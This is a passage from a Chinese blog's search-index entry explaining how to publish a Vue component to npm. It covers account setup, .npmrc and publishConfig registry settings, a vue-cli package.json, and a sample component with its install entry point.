配置的是用户配置文件</p><p>-g 会配置到全局配置文件</p><h2 id="npm-组件发布流程"><a href="#npm-组件发布流程" class="headerlink" title="npm 组件发布流程"></a>npm 组件发布流程</h2><ul><li>去 npm 官网申请账号</li><li>添加账号到你电脑</li><li>开发你的组件，使用 webpack,babel 处理</li><li>npm 发布你的包</li></ul><h3 id="申请账号"><a href="#申请账号" class="headerlink" title="申请账号"></a>申请账号</h3><p><a href="https://www.npmjs.com/">官网</a>申请一个账号，用于登录和发布组件。</p><p>在项目的根路径下创建 <code>.npmrc</code> 配置文件，添加如下内容。</p><pre class="line-numbers language-txt"><code class="language-txt"># 安装包的时候，配置阿里镜像registry = https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在 <code>package.json</code> 中配置发布源。</p><pre class="line-numbers language-json"><code class="language-json"><span class="token property">"publishConfig"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token property">"registry"</span><span class="token operator">:</span> <span class="token string">"https://registry.npmjs.com/"</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样下载依赖包会从淘宝镜像下载，发布依赖包会发布到 npm 官网去。</p><h3 id="添加账号到你电脑"><a href="#添加账号到你电脑" class="headerlink" title="添加账号到你电脑"></a>添加账号到你电脑</h3><p> <a href="https://docs.npmjs.com/cli/adduser">添加账号命令官网说明 npm adduser</a></p><pre><code># npm adduser [--registry=url] [--scope=@orgname] [--always-auth] [--auth-type=legacy]npm adduser  --registry=https://registry.npmjs.com/</code></pre><p>运行上述命令，.npmrc 用户配置文件生成一下内容</p><pre><code>registry=https://registry.npmjs.com///registry.npmjs.com/:_authToken=xxx</code></pre><h3 id="开发你的组件，使用-webpack-babel-处理"><a href="#开发你的组件，使用-webpack-babel-处理" class="headerlink" title="开发你的组件，使用 webpack,babel 处理"></a>开发你的组件，使用 webpack,babel 处理</h3><p>由于 webpack,babel 配置比较麻烦，这里使用 <a href="https://cli.vuejs.org/zh/">vue-cli</a> 脚手架进行开发</p><h4 id="package-json-1"><a href="#package-json-1" class="headerlink" title="package.json"></a>package.json</h4><pre class="line-numbers language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"@thingjs-ad/thingjs-app"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.1"</span><span class="token punctuation">,</span>    <span class="token property">"private"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token property">"scripts"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"serve"</span><span class="token operator">:</span> <span class="token string">"vue-cli-service serve"</span><span class="token punctuation">,</span>        <span class="token property">"build"</span><span class="token operator">:</span> <span class="token string">"vue-cli-service build --target lib --name thingjs-app ./src/index.js"</span><span class="token punctuation">,</span>        <span class="token property">"lint"</span><span class="token operator">:</span> <span class="token string">"vue-cli-service lint"</span><span class="token punctuation">,</span>        <span class="token property">"pub"</span><span class="token operator">:</span> <span class="token string">"npm run build &amp;&amp; npm publish --access=public"</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"dist/thingjs-app.umd.min.js"</span><span class="token punctuation">,</span>    <span class="token property">"files"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"src"</span><span class="token punctuation">,</span>        <span class="token string">"dist"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"devDependencies"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"@vue/cli-plugin-babel"</span><span class="token operator">:</span> <span class="token string">"^4.2.0"</span><span class="token punctuation">,</span>        <span class="token property">"@vue/cli-plugin-eslint"</span><span class="token operator">:</span> <span class="token string">"^4.2.0"</span><span class="token punctuation">,</span>        <span class="token property">"@vue/cli-service"</span><span class="token operator">:</span> <span class="token string">"^4.2.0"</span><span class="token punctuation">,</span>        <span class="token property">"babel-eslint"</span><span class="token operator">:</span> <span class="token string">"^10.0.3"</span><span class="token punctuation">,</span>        <span class="token property">"eslint"</span><span class="token operator">:</span> <span class="token string">"^6.7.2"</span><span class="token punctuation">,</span>        <span class="token property">"eslint-plugin-vue"</span><span class="token operator">:</span> <span class="token string">"^6.1.2"</span><span class="token punctuation">,</span>        <span class="token property">"vue-template-compiler"</span><span class="token operator">:</span> <span class="token string">"^2.6.11"</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token property">"eslintConfig"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"root"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"env"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token property">"node"</span><span class="token operator">:</span> <span class="token boolean">true</span>        &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>        <span class="token property">"extends"</span><span class="token operator">:</span> <span class="token punctuation">[</span>            <span class="token string">"plugin:vue/essential"</span><span class="token punctuation">,</span>            <span class="token string">"eslint:recommended"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parserOptions"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token property">"parser"</span><span class="token operator">:</span> <span class="token string">"babel-eslint"</span>        &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>        <span class="token property">"rules"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token property">"browserslist"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"> 1%"</span><span class="token punctuation">,</span>        <span class="token string">"last 2 versions"</span>    <span class="token punctuation">]</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="组件内容"><a href="#组件内容" class="headerlink" title="组件内容"></a>组件内容</h4><p><img src="http://oss.mflyyou.cn/blog/20200304021841.png"></p><ul><li>AA.vue </li></ul><pre><code>&lt;template&gt;     &lt;div&gt;         AA 组件     &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;    name:&#39;AA&#39;&#125;;&lt;/script&gt;</code></pre><ul><li>index.js</li></ul><pre><code>import AA from &#39;./components/AA.vue&#39;;const components = [AA];// 当调用 Vue.use,实际会调用这个 install 方法。Vue.component 注册全局组件。const install = function (Vue) &#123;    components.forEach(component =&gt; &#123;        Vue.component(component.name, component);    &#125;);&#125;;if (typeof window !== &#39;undefined&#39; &amp;&amp; window.Vue) &#123;    install(window.Vue);&#125;export default &#123;    version: &#39;1.0.0&#39;,    install,    AA&#125;</code></pre><h3 id="发布组件"><a href="#发布组件" class="headerlink" title="发布组件"></a>发布组件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> publish --access<span class="token operator">=</span>public<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> npm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
